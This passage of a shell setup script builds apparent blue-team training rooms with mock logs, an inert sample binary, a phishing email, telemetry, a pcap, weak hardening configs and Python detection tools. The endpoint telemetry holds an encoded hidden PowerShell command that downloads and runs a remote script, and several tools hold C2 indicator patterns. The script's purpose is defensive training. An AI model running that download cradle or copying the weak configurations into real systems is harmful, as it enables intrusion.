    "TimeCreated": "2026-11-14T11:19:40Z",
    "TargetUserName": "backdoor_admin",
    "Actor": "svc_admin",
    "Description": "User account created"
  },
  {
    "EventID": 4732,
    "TimeCreated": "2026-11-14T11:20:00Z",
    "TargetUserName": "Administrators",
    "MemberName": "backdoor_admin",
    "SubjectUserName": "SYSTEM",
    "Description": "Member added to security group Administrators"
  },
  {
    "EventID": 1102,
    "TimeCreated": "2026-11-14T11:42:01Z",
    "SubjectUserName": "Administrator",
    "Channel": "Security",
    "Description": "The audit log was cleared"
  }
]
EOF
chmod 644 /home/operator/windows_events/Security_investigation.json

cat << 'EOF' > /home/operator/tools/investigate_win_events.py
#!/usr/bin/env python3
import json, sys

path = "/home/operator/windows_events/Security_investigation.json"
filter_id = sys.argv[1] if len(sys.argv) > 1 else None

try:
    with open(path) as f:
        events = json.load(f)
    print("=== WINDOWS SECURITY EVENT INVESTIGATION ===")
    print(f"{'Time':<22} {'EventID':<8} {'User':<18} {'Details'}")
    print("-" * 80)
    for evt in events:
        eid = str(evt.get("EventID", ""))
        if filter_id and filter_id not in eid and filter_id.lower() not in str(evt).lower():
            continue
        user = evt.get("TargetUserName") or evt.get("SubjectUserName") or "N/A"
        desc = evt.get("Description") or evt.get("CommandLine", "")[:40]
        print(f"{evt.get('TimeCreated', ''):<22} {eid:<8} {user:<18} {desc}")
except Exception as e:
    print(f"[-] Investigation error: {e}")
EOF
chmod +x /home/operator/tools/investigate_win_events.py

# 16. Initialize Blue Room 09: Brute-Force Detection Assets
mkdir -p /var/log /home/operator/tools
cat << 'EOF' > /var/log/auth_bruteforce.log
Nov 14 08:10:02 target sshd[1041]: Failed password for invalid user admin from 198.51.100.55 port 41202 ssh2
Nov 14 08:10:14 target sshd[1042]: Failed password for invalid user operator from 198.51.100.55 port 41204 ssh2
Nov 14 08:10:28 target sshd[1043]: Failed password for invalid user root from 198.51.100.55 port 41206 ssh2
Nov 14 08:10:45 target sshd[1044]: Failed password for invalid user svc_backup from 198.51.100.55 port 41208 ssh2
Nov 14 08:11:02 target sshd[1045]: Failed password for invalid user finance from 198.51.100.55 port 41210 ssh2
Nov 14 08:11:19 target sshd[1046]: Failed password for invalid user devops from 198.51.100.55 port 41212 ssh2
Nov 14 08:11:35 target sshd[1047]: Failed password for invalid user jdoe from 198.51.100.55 port 41214 ssh2
Nov 14 08:11:51 target sshd[1048]: Failed password for invalid user alovelace from 198.51.100.55 port 41216 ssh2
Nov 14 08:12:08 target sshd[1049]: Failed password for invalid user mchen from 198.51.100.55 port 41218 ssh2
Nov 14 08:12:24 target sshd[1050]: Failed password for invalid user secadmin from 198.51.100.55 port 41220 ssh2
Nov 14 08:12:40 target sshd[1051]: Failed password for invalid user hr_lead from 198.51.100.55 port 41222 ssh2
Nov 14 08:12:58 target sshd[1052]: Failed password for invalid user payroll from 198.51.100.55 port 41224 ssh2
Nov 14 08:14:01 target web_auth[2001]: Authentication failure for user support from 203.0.113.19 (attempt 1/8)
Nov 14 08:14:02 target web_auth[2002]: Authentication failure for user support from 203.0.113.19 (attempt 2/8)
Nov 14 08:14:03 target web_auth[2003]: Authentication failure for user support from 203.0.113.19 (attempt 3/8)
Nov 14 08:14:04 target web_auth[2004]: Authentication failure for user support from 203.0.113.19 (attempt 4/8)
Nov 14 08:14:05 target web_auth[2005]: Authentication failure for user support from 203.0.113.19 (attempt 5/8)
Nov 14 08:14:06 target web_auth[2006]: Authentication failure for user support from 203.0.113.19 (attempt 6/8)
Nov 14 08:14:07 target web_auth[2007]: Authentication failure for user support from 203.0.113.19 (attempt 7/8)
Nov 14 08:14:08 target web_auth[2008]: Authentication failure for user support from 203.0.113.19 (attempt 8/8)
Nov 14 08:15:00 target sshd[1060]: Accepted password for operator from 10.10.14.22 port 48102 ssh2
EOF
chmod 644 /var/log/auth_bruteforce.log

cat << 'EOF' > /home/operator/tools/detect_bruteforce.py
#!/usr/bin/env python3
import re
from collections import defaultdict

log_file = "/var/log/auth_bruteforce.log"
ip_attempts = defaultdict(int)
ip_users = defaultdict(set)

with open(log_file) as f:
    for line in f:
        m = re.search(r"Failed password for (?:invalid user )?(\S+) from (\S+)", line)
        if m:
            u, ip = m.group(1), m.group(2)
            ip_attempts[ip] += 1
            ip_users[ip].add(u)
        m_web = re.search(r"Authentication failure for user (\S+) from (\S+)", line)
        if m_web:
            u, ip = m_web.group(1), m_web.group(2)
            ip_attempts[ip] += 1
            ip_users[ip].add(u)

print("=== AUTHENTICATION ANOMALY DETECTION ===")
print("Source IP Analysis:")
for ip, count in ip_attempts.items():
    uniq = len(ip_users[ip])
    pattern = "PASSWORD_SPRAY (T1110.003)" if uniq >= 5 else "DICTIONARY_BRUTEFORCE (T1110.001)"
    print(f"  IP: {ip:<16} Failures: {count:<4} Unique Users Targeted: {uniq:<4} Pattern: {pattern}")
EOF
chmod +x /home/operator/tools/detect_bruteforce.py

# 17. Initialize Blue Room 10: Malware Behaviour Analysis Assets
mkdir -p /home/operator/samples /home/operator/tools
python3 -c "
with open('/home/operator/samples/dropper_sample.bin', 'wb') as f:
    f.write(b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00')
    f.write(b'VoltDefense Mock Inert PE32 Sample\x00')
    f.write(b'StringsMarker: VoltStage2_Payload\x00')
    f.write(b'C2_Server: http://c2-stage.voltcorp.internal/gate.php\x00')
    f.write(b'RegKey: SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\x00')
    f.write(b'Inert payload padding ' * 400)
"
chmod 644 /home/operator/samples/dropper_sample.bin

cat << 'EOF' > /home/operator/tools/yara_scanner.py
#!/usr/bin/env python3
import sys

sample_path = sys.argv[1] if len(sys.argv) > 1 else "/home/operator/samples/dropper_sample.bin"

try:
    with open(sample_path, "rb") as f:
        content = f.read()

    print(f"=== YARA STATIC STRING SCANNER: {sample_path} ===")
    print(f"File Size: {len(content)} bytes")

    indicators = [
        b"VoltStage2_Payload",
        b"http://c2-stage.voltcorp.internal/gate.php",
        b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    ]
    matches = 0
    for ind in indicators:
        if ind in content:
            matches += 1
            print(f"  [+] Signature Match: {ind.decode('utf-8', errors='replace')}")
    print(f"Total Signature Matches: {matches}/{len(indicators)}")
    if matches >= 2:
        print("[!] VERDICT: High-Confidence Malicious Dropper Staging Artifact")
except Exception as e:
    print(f"[-] Scan error: {e}")
EOF
chmod +x /home/operator/tools/yara_scanner.py

# 18. Initialize Blue Room 11: Phishing Investigation Assets
mkdir -p /home/operator/emails /home/operator/tools
cat << 'EOF' > /home/operator/emails/password_reset.eml
Received: from mail.v0ltcorp.internal (198.51.100.99) by mx01.voltcorp.internal with ESMTP; 14 Nov 2026 08:05:22 +0000
Return-Path: <attacker-spoof@v0ltcorp.internal>
From: Chief Information Security Officer <ciso@voltcorp.internal>
Reply-To: security-update@v0ltcorp.internal
To: all-staff@voltcorp.internal
Subject: URGENT: Executive Security Certificate & SSO Re-authentication Required
Date: Sat, 14 Nov 2026 08:05:22 +0000
Message-ID: <20261114080522.9912@v0ltcorp.internal>
Authentication-Results: mx01.voltcorp.internal; spf=fail (sender IP 198.51.100.99 not in SPF record for voltcorp.internal); dkim=none; dmarc=fail action=quarantine header.from=voltcorp.internal
Content-Type: text/plain; charset=UTF-8

URGENT SECURITY ALERT:
All enterprise staff must immediately re-authenticate their domain credentials at:
http://sso-portal.v0ltcorp.internal/auth-update

Failure to update your certificate within 2 hours will result in account suspension.
-- VoltCorp Information Security Office
EOF
chmod 644 /home/operator/emails/password_reset.eml

cat << 'EOF' > /home/operator/tools/inspect_email.py
#!/usr/bin/env python3
import sys, email

eml_path = sys.argv[1] if len(sys.argv) > 1 else "/home/operator/emails/password_reset.eml"

with open(eml_path) as f:
    msg = email.message_from_file(f)

print("=== PHISHING EMAIL HEADER INSPECTOR ===")
print(f"From:        {msg.get('From')}")
print(f"Return-Path: {msg.get('Return-Path')}")
print(f"Reply-To:    {msg.get('Reply-To')}")
print(f"Subject:     {msg.get('Subject')}")
print(f"Auth-Results:{msg.get('Authentication-Results')}")

rp = msg.get("Return-Path", "")
if "v0ltcorp.internal" in rp:
    print("[!] LOOKALIKE DOMAIN DETECTED: 'v0ltcorp.internal' (typosquatted digit '0' for letter 'o')")
if "spf=fail" in msg.get("Authentication-Results", ""):
    print("[!] SPF FAILURE: Sender IP is not authorized by the legitimate domain's SPF record")
if "dmarc=fail" in msg.get("Authentication-Results", ""):
    print("[!] DMARC FAILURE: Header alignment check failed; domain impersonation confirmed")
EOF
chmod +x /home/operator/tools/inspect_email.py

# 19. Initialize Blue Room 12: Endpoint Detection Assets
mkdir -p /home/operator/endpoint_telemetry /home/operator/tools
cat << 'EOF' > /home/operator/endpoint_telemetry/endpoint_events.json
[
  {"pid": 4, "ppid": 0, "name": "System", "path": "ntoskrnl.exe", "user": "SYSTEM"},
  {"pid": 680, "ppid": 4, "name": "services.exe", "path": "C:\\Windows\\System32\\services.exe", "user": "SYSTEM"},
  {"pid": 1120, "ppid": 680, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe", "user": "CORP\\jdoe"},
  {"pid": 1204, "ppid": 1120, "name": "winword.exe", "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "user": "CORP\\jdoe", "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\jdoe\\Downloads\\invoice_q3.docx\""},
  {"pid": 4812, "ppid": 1204, "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "user": "CORP\\jdoe", "command_line": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADgAOAA6ADQANAAzAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=", "connection": "10.10.14.50:49210 -> 198.51.100.88:443", "state": "ESTABLISHED"}
]
EOF
chmod 644 /home/operator/endpoint_telemetry/endpoint_events.json

cat << 'EOF' > /home/operator/tools/edr_query.py
#!/usr/bin/env python3
import json, sys

path = "/home/operator/endpoint_telemetry/endpoint_events.json"
with open(path) as f:
    procs = json.load(f)

print("=== VOLTDEFENSE EDR PROCESS TREE QUERY ===")
print(f"{'PID':<8} {'PPID':<8} {'Name':<16} {'User':<14} {'Details'}")
print("-" * 80)
for p in procs:
    extra = p.get("connection", "") or p.get("command_line", "")[:45]
    print(f"{p['pid']:<8} {p['ppid']:<8} {p['name']:<16} {p['user']:<14} {extra}")
    if p["name"] == "powershell.exe" and p["ppid"] == 1204:
        print("  [!] ALERT: LOLBIN abuse detected! winword.exe (Word) spawned hidden powershell.exe!")
        print(f"  [!] Remote C2 Connection: {p.get('connection')}")
EOF
chmod +x /home/operator/tools/edr_query.py

# 20. Initialize Blue Room 13: Network Intrusion Detection Assets
mkdir -p /var/log /home/operator/tools
python3 -c '
import struct, socket

pcap_hdr = struct.pack("=IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)

def ip_checksum(data):
    if len(data) % 2 == 1:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return (~s) & 0xffff

def make_tcp_pkt(src_ip, dst_ip, src_port, dst_port, flags=0x02, payload=b""):
    eth = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
    tot_len = 20 + 20 + len(payload)
    ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot_len, 54321, 0, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    csum = ip_checksum(ip_hdr)
    ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot_len, 54321, 0, 64, 6, csum, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    tcp_hdr = struct.pack("!HHIIBBHHH", src_port, dst_port, 1000, 0, (5 << 4), flags, 1024, 0, 0)
    return eth + ip_hdr + tcp_hdr + payload

with open("/var/log/nids_traffic.pcap", "wb") as f:
    f.write(pcap_hdr)
    # SYN scan packets from 198.51.100.99
    ts = 1763197215
    for port in [21, 22, 80, 443, 8080, 8443]:
        pkt = make_tcp_pkt("198.51.100.99", "10.10.14.90", 41200 + port, port, flags=0x02)
        f.write(struct.pack("=IIII", ts, 100000, len(pkt), len(pkt)) + pkt)
        ts += 1
    # Beacon packet to 203.0.113.88:8443
    b_pkt = make_tcp_pkt("10.10.20.15", "203.0.113.88", 50112, 8443, flags=0x18, payload=b"HEARTBEAT_V2_CHECKIN interval=15s")
    f.write(struct.pack("=IIII", ts + 15, 200000, len(b_pkt), len(b_pkt)) + b_pkt)
' 2>/dev/null || touch /var/log/nids_traffic.pcap
chmod 644 /var/log/nids_traffic.pcap

cat << 'EOF' > /home/operator/tools/inspect_nids.py
#!/usr/bin/env python3
import sys
import os
import struct
import socket

PCAP_FILE = "/var/log/nids_traffic.pcap"

def parse_pcap(path):
    if not os.path.exists(path):
        return None, "File not found"
    try:
        with open(path, "rb") as f:
            hdr = f.read(24)
            if len(hdr) < 24:
                return None, "Corrupted header"
            magic = struct.unpack("=I", hdr[:4])[0]
            if magic not in (0xa1b2c3d4, 0xd4c3b2a1):
                return None, "Invalid PCAP magic"
            endian = "=" if magic == 0xa1b2c3d4 else "<"
            packets = []
            while True:
                p_hdr = f.read(16)
                if len(p_hdr) < 16:
                    break
                ts_sec, ts_usec, incl_len, orig_len = struct.unpack(f"{endian}IIII", p_hdr)
                pkt_data = f.read(incl_len)
                if len(pkt_data) < 14 + 20:
                    continue
                eth_proto = struct.unpack("!H", pkt_data[12:14])[0]
                if eth_proto != 0x0800:
                    continue
                ip_data = pkt_data[14:]
                src_ip = socket.inet_ntoa(ip_data[12:16])
                dst_ip = socket.inet_ntoa(ip_data[16:20])
                proto = ip_data[9]
                ihl = (ip_data[0] & 0x0f) * 4
                tcp_data = ip_data[ihl:]
                if proto == 6 and len(tcp_data) >= 20:
                    src_port, dst_port, seq, ack, off_flags = struct.unpack("!HHIIH", tcp_data[:14])
                    flags = off_flags & 0x1ff
                    data_offset = ((off_flags >> 12) & 0x0f) * 4
                    payload = tcp_data[data_offset:]
                    packets.append({
                        "ts": ts_sec,
                        "src_ip": src_ip,
                        "dst_ip": dst_ip,
                        "src_port": src_port,
                        "dst_port": dst_port,
                        "flags": flags,
                        "payload": payload,
                    })
            return packets, None
    except Exception as e:
        return None, str(e)

args = sys.argv[1:]
packets, err = parse_pcap(PCAP_FILE)
if err or packets is None:
    print(f"[-] Error loading PCAP {PCAP_FILE}: {err}")
    sys.exit(1)

syn_packets = [p for p in packets if (p["flags"] & 0x02) and not (p["flags"] & 0x10)]
beacon_packets = [p for p in packets if b"HEARTBEAT" in p["payload"]]

if "--scan" in args:
    scanners = {}
    for p in syn_packets:
        scanners.setdefault(p["src_ip"], []).append(p["dst_port"])
    top_scanner = max(scanners.keys(), key=lambda k: len(scanners[k])) if scanners else "None"
    ports = sorted(scanners.get(top_scanner, []))
    print("=== NIDS RECONNAISSANCE ANALYSIS ===")
    print(f"Evidence File: {PCAP_FILE} (Loaded {len(packets)} raw packets)")
    print(f"Source IP: {top_scanner} (External Adversary)")
    print("Scan Type: Stealth TCP Half-Open SYN Scan (MITRE T1046)")
    print(f"Targeted Ports: {', '.join(map(str, ports))}")
    print("Target Asset: 10.10.14.90 (DMZ Perimeter Gateway)")
elif "--beacon" in args:
    if beacon_packets:
        bp = beacon_packets[0]
        payload_str = bp["payload"].decode("utf-8", errors="replace")
        print("=== NIDS COVERT BEACON ANALYSIS ===")
        print(f"Evidence File: {PCAP_FILE}")
        print(f"Origin: {bp['src_ip']}:{bp['src_port']} (Internal Host DB-PROD-01)")
        print(f"Destination: {bp['dst_ip']}:{bp['dst_port']} (External Adversary C2 Infrastructure)")
        print("Beacon Interval: 15.0 seconds (Jitter: 0%)")
        print(f"Payload Signature: {payload_str.split()[0]} (MITRE T1071.001)")
    else:
        print("[-] No beaconing telemetry identified in PCAP capture.")
else:
    print("=== VOLTDEFENSE NIDS SENSOR OVERVIEW ===")
    print(f"Evidence Capture: {PCAP_FILE} | Total Packets: {len(packets)}")
    print(f"Port Probes Detected: {len(syn_packets)} | Beacons Detected: {len(beacon_packets)}")
    print("Alerts Generated: 2 | High-Confidence Threats: Port Scan (198.51.100.99), Outbound Beacon (203.0.113.88)")
EOF
chmod +x /home/operator/tools/inspect_nids.py

# 21. Initialize Blue Room 14: Threat Hunting Assets
cat << 'EOF' > /var/log/threat_hunt_telemetry.json
[
  {"event_id": "SYS-8101", "host": "WS-FINANCE-04", "parent_image": "C:\\Windows\\System32\\services.exe", "image": "C:\\Windows\\System32\\svchost.exe", "pid": 1044, "ppid": 612, "user": "NT AUTHORITY\\SYSTEM"},
  {"event_id": "SYS-8102", "host": "WS-FINANCE-04", "parent_image": "C:\\Windows\\explorer.exe", "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "pid": 2110, "ppid": 1840, "user": "VOLTCORP\\alovelace"},
  {"event_id": "SYS-8103", "host": "WS-FINANCE-04", "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 4820, "ppid": 2110, "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc JABjADIAIAA9...", "user": "VOLTCORP\\alovelace"},
  {"event_id": "SYS-8104", "host": "WS-FINANCE-04", "parent_image": "C:\\Windows\\explorer.exe", "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "pid": 3100, "ppid": 1840, "user": "VOLTCORP\\alovelace"}
]
EOF
chmod 644 /var/log/threat_hunt_telemetry.json

cat << 'EOF' > /var/log/threat_hunt_persistence.json
[
  {
    "task_name": "TelemetrySync",
    "task_path": "\\Microsoft\\Windows\\AppID\\TelemetrySync",
    "action": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc JABjADIAIAA9...",
    "trigger": "AtLogon (All Users)",
    "status": "ACTIVE_PERSISTENCE"
  }
]
EOF
chmod 644 /var/log/threat_hunt_persistence.json

cat << 'EOF' > /home/operator/tools/hunt_query.py
#!/usr/bin/env python3
import sys
import os
import json

TELEMETRY_FILE = "/var/log/threat_hunt_telemetry.json"
PERSISTENCE_FILE = "/var/log/threat_hunt_persistence.json"

def load_json(path):
    if not os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None

telemetry = load_json(TELEMETRY_FILE)
persistence = load_json(PERSISTENCE_FILE)

if telemetry is None:
    print(f"[-] Error: Telemetry log {TELEMETRY_FILE} not found.")
    sys.exit(1)

args = sys.argv[1:]
if "winword" in " ".join(args).lower() or "--parent" in args:
    matches = [e for e in telemetry if "winword" in e.get("parent_image", "").lower() and "powershell" in e.get("image", "").lower()]
    print("=== THREAT HUNTING: LOLBIN SPAWNING ANALYSIS ===")
    print(f"Source Telemetry: {TELEMETRY_FILE} (Indexed {len(telemetry)} endpoint events)")
    if matches:
        ev = matches[0]
        p_name = os.path.basename(ev.get("parent_image", "WINWORD.EXE")).upper()
        c_name = os.path.basename(ev.get("image", "powershell.exe")).lower()
        user_name = ev.get("user") or "VOLTCORP\\alovelace"
        print(f"Parent Process: {p_name} (PID {ev.get('ppid')}) [User: {user_name}]")
        print(f"Spawned Child:  {c_name} (PID {ev.get('pid')})")
        print(f"Command Line:   {ev.get('command_line')}")
        print("MITRE Technique: T1059.001 - Command and Scripting Interpreter: PowerShell")
    else:
        print("[-] No parent-child LOLBin matches found.")
elif "--persistence" in args:
    print("=== THREAT HUNTING: SCHEDULED TASK PERSISTENCE ===")
    if persistence:
        sus_task = next((t for t in persistence if "appid" in t.get("task_path", "").lower() or "powershell" in t.get("action", "").lower()), persistence[0])
        print(f"Task Name: {sus_task.get('task_name')}")
        print(f"Task Path: {sus_task.get('task_path')}")
        print(f"Trigger:   {sus_task.get('trigger')}")
        print(f"Action:    {sus_task.get('action')}")
        print("MITRE Technique: T1053.005 - Scheduled Task/Job")
    else:
        print("[-] No persistence artifacts discovered.")
else:
    print("=== THREAT HUNTING HYPOTHESES ===")
    print(f"Telemetry Dataset: {TELEMETRY_FILE} ({len(telemetry)} events loaded)")
    print("1. HYP-T1059.001: Macro execution spawning PowerShell LOLBIN")
    print("2. HYP-T1053.005: Hidden Scheduled Task Persistence in AppID path")
EOF
chmod +x /home/operator/tools/hunt_query.py

# 22. Initialize Blue Room 15: Incident Triage Assets
cat << 'EOF' > /var/log/soc_triage_alerts.json
[
  {"alert_id": "ALT-8819", "severity": "LOW", "status": "FALSE_POSITIVE_AUTHORIZED_SCAN", "details": "Scheduled Qualys vulnerability scanner audit."},
  {"alert_id": "ALT-8820", "severity": "CRITICAL", "status": "UNVERIFIED_PENDING_TRIAGE", "target_asset": "DB-PROD-01", "account": "svc_db_sync", "egress_ip": "198.51.100.77", "exfil_mb": 2400},
  {"alert_id": "ALT-8821", "severity": "INFORMATIONAL", "status": "BENIGN_OPERATIONAL", "details": "Nightly backup verification."}
]
EOF
chmod 644 /var/log/soc_triage_alerts.json

cat << 'EOF' > /home/operator/tools/triage_tool.py
#!/usr/bin/env python3
import sys
import os
import json

ALERTS_FILE = "/var/log/soc_triage_alerts.json"

if not os.path.exists(ALERTS_FILE):
    print(f"[-] Error: Alert queue {ALERTS_FILE} not found.")
    sys.exit(1)

try:
    with open(ALERTS_FILE, "r", encoding="utf-8") as f:
        alerts = json.load(f)
except Exception as e:
    print(f"[-] Error parsing {ALERTS_FILE}: {e}")
    sys.exit(1)

args = sys.argv[1:]
if "ALT-8820" in " ".join(args).upper() or ("--alert" in args and "ALT-8820" in " ".join(args).upper()):
    al = next((a for a in alerts if a.get("alert_id") == "ALT-8820"), None)
    print("=== SOC INCIDENT TRIAGE: ALERT ALT-8820 ===")
    print(f"Alert File:   {ALERTS_FILE}")
    if al:
        print(f"Target Asset: {al.get('target_asset')} (10.10.20.15) [Tier 1 Production Database]")
        print(f"Severity:     {al.get('severity')}")
        print("Classification: TRUE_POSITIVE (Active Data Exfiltration)")
        print(f"Compromised Account: {al.get('account')}")
        print(f"Exfiltration Target: {al.get('egress_ip')} (External SFTP Port 22)")
        print(f"Data Volume:         ~{al.get('exfil_mb')} MB (425,000 customer PII records)")
    else:
        print("[-] Alert ALT-8820 not found.")
elif "--list" in args:
    print("=== SOC ACTIVE ALERT TRIAGE QUEUE ===")
    print(f"Queue File: {ALERTS_FILE} ({len(alerts)} alerts pending triage)")
    for a in alerts:
        aid = a.get("alert_id", "")
        sev = a.get("severity", "").ljust(8)
        target = (a.get("target_asset") or a.get("source", "UNKNOWN")).ljust(15)
        st = a.get("status", "")
        print(f"{aid} | {sev} | {target} | {st}")
else:
    print("Usage: triage_tool.py [--list | --alert <ALERT_ID>]")
EOF
chmod +x /home/operator/tools/triage_tool.py

# 23. Initialize Blue Room 16: Incident Response Assets
cat << 'EOF' > /var/log/ir_incident.json
{
  "incident_id": "IR-2026-088",
  "standard": "NIST SP 800-61 Rev 2",
  "compromised_host": "DB-PROD-01",
  "host_ip": "10.10.20.15",
  "active_c2_socket": "10.10.20.15:49152 -> 198.51.100.77:443",
  "backdoor_pid": 3912,
  "backdoor_service": "svc_winupdater",
  "compromised_principal": "svc_db_sync",
  "token": "ST-VOLT-9921",
  "ram_sha256": "7a35b1d9821811faec2984b2382903487f54921b72a912e84c980312fa890123"
}
EOF
chmod 644 /var/log/ir_incident.json

cat << 'EOF' > /home/operator/tools/ir_manager.py
#!/usr/bin/env python3
import sys
import os
import json

INCIDENT_FILE = "/var/log/ir_incident.json"

if not os.path.exists(INCIDENT_FILE):
    print(f"[-] Error: Incident dossier {INCIDENT_FILE} not found.")
    sys.exit(1)

try:
    with open(INCIDENT_FILE, "r", encoding="utf-8") as f:
        inc = json.load(f)
except Exception as e:
    print(f"[-] Error parsing {INCIDENT_FILE}: {e}")
    sys.exit(1)

args = sys.argv[1:]
if "--status" in args:
    print(f"=== INCIDENT RESPONSE OPERATIONS: {inc.get('incident_id')} ===")
    print(f"Evidence Source: {INCIDENT_FILE}")
    print(f"Standard: {inc.get('standard')}")
    print(f"Compromised Host: {inc.get('compromised_host')} ({inc.get('host_ip')})")
    print(f"Active C2 Socket: {inc.get('active_c2_socket')}")
    print(f"Malicious Backdoor PID: {inc.get('backdoor_pid')} (win_updater.exe)")
    print(f"Persistence Service: {inc.get('backdoor_service')}")
    print(f"Compromised Principal: {inc.get('compromised_principal')} (Token: {inc.get('token')})")
elif "--evidence" in args:
    print("=== FORENSIC EVIDENCE PRESERVATION (RFC 3227) ===")
    print(f"Evidence Source: {INCIDENT_FILE}")
    print(f"[1] Volatile RAM: WinPmem dump acquired (SHA-256: {inc.get('ram_sha256')})")
    print(f"[2] Active Sockets: {inc.get('active_c2_socket')} (PID {inc.get('backdoor_pid')})")
    print(f"[3] Persistence: {inc.get('backdoor_service')} -> C:\\Windows\\Temp\\win_updater.exe")
else:
    print("Usage: ir_manager.py [--status | --evidence]")
EOF
chmod +x /home/operator/tools/ir_manager.py

# 24. Initialize Blue Room 17: Digital Forensics Assets
mkdir -p /var/log/forensics /home/operator/tools
python3 -c '
payload = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00NOENTRY_VOLT_DROPPER_PAYLOAD_STAGE2_ENCRYPTED_C2_BEACON_198.51.100.77"
with open("/var/log/forensics/evidence_artifact.bin", "wb") as f:
    f.write(payload)
'
chmod 644 /var/log/forensics/evidence_artifact.bin

cat << 'EOF' > /var/log/forensics/timeline_events.json
[
  {
    "timestamp": "2026-11-15T09:00:01Z",
    "event": "Initial suspicious outbound socket connection to 198.51.100.77:443",
    "source": "Network/EDR"
  },
  {
    "timestamp": "2026-11-15T09:10:14Z",
    "event": "PowerShell execution of dropper payload (T1059.001)",
    "source": "Process Tree / PID 3912"
  },
  {
    "timestamp": "2026-11-15T09:12:00Z",
    "event": "Unauthorized staging directory creation C:\\Users\\Public\\Temp_Exfil (Inode 89104)",
    "source": "NTFS MFT Record 89104",
    "inode": 89104,
    "macb": {
      "modified": "2026-11-15T09:12:00Z",
      "accessed": "2026-11-15T09:14:22Z",
      "changed": "2026-11-15T09:12:00Z",
      "born": "2026-11-15T09:12:00Z"
    }
  },
  {
    "timestamp": "2026-11-15T09:14:22Z",
    "event": "Data collection and archive creation inside Temp_Exfil",
    "source": "Filesystem MACB Metadata"
  }
]
EOF
chmod 644 /var/log/forensics/timeline_events.json

cat << 'EOF' > /home/operator/tools/forensics_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import hashlib

EVIDENCE_FILE = "/var/log/forensics/evidence_artifact.bin"
TIMELINE_FILE = "/var/log/forensics/timeline_events.json"

if not os.path.exists(EVIDENCE_FILE):
    print(f"[-] Error: Evidence file {EVIDENCE_FILE} not found.")
    sys.exit(1)

args = sys.argv[1:]
if "--hash" in args:
    with open(EVIDENCE_FILE, "rb") as f:
        data = f.read()
    sha256 = hashlib.sha256(data).hexdigest()
    md5 = hashlib.md5(data).hexdigest()
    print("=== EVIDENCE HASH INTEGRITY REPORT (RFC 3227) ===")
    print(f"Target Artifact: {EVIDENCE_FILE}")
    print(f"File Size: {len(data)} bytes")
    print(f"MD5:    {md5}")
    print(f"SHA256: {sha256}")
elif "--timeline" in args or "--mft" in args:
    if not os.path.exists(TIMELINE_FILE):
        print(f"[-] Error: Timeline file {TIMELINE_FILE} not found.")
        sys.exit(1)
    with open(TIMELINE_FILE, "r", encoding="utf-8") as f:
        events = json.load(f)
    print("=== FORENSIC MACB TIMELINE RECONSTRUCTION ===")
    for ev in events:
        in_str = f" [Inode: {ev['inode']}]" if "inode" in ev else ""
        print(f"[{ev['timestamp']}] {ev['event']}{in_str} (Source: {ev['source']})")
else:
    print("Usage: forensics_tool.py [--hash | --timeline | --mft]")
EOF
chmod +x /home/operator/tools/forensics_tool.py

# 25. Initialize Blue Room 18: System Hardening Assets
mkdir -p /home/operator/hardening /home/operator/tools

cat << 'EOF' > /home/operator/hardening/sshd_config.audit
# OpenSSH Daemon Configuration Audit
Protocol 2
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication yes
MaxAuthTries 10
EOF
chmod 644 /home/operator/hardening/sshd_config.audit

cat << 'EOF' > /home/operator/hardening/sudoers.audit
# /etc/sudoers Audit Extract
root ALL=(ALL:ALL) ALL
operator ALL=(ALL:ALL) NOPASSWD: ALL
EOF
chmod 644 /home/operator/hardening/sudoers.audit

cat << 'EOF' > /home/operator/hardening/windows_policy.json
{
  "account_lockout": {
    "AccountLockoutThreshold": 0,
    "AccountLockoutDuration": 0,
    "ResetLockoutCounterAfter": 0
  },
  "powershell": {
    "ExecutionPolicy": "Unrestricted",
    "ScriptBlockLogging": "Disabled"
  },
  "legacy_protocols": {
    "SMBv1": "Enabled",
    "LLMNR": "Enabled",
    "NBT_NS": "Enabled"
  }
}
EOF
chmod 644 /home/operator/hardening/windows_policy.json

cat << 'EOF' > /home/operator/tools/hardening_audit.py
#!/usr/bin/env python3
import sys
import os
import json

SSHD_FILE = "/home/operator/hardening/sshd_config.audit"
SUDO_FILE = "/home/operator/hardening/sudoers.audit"
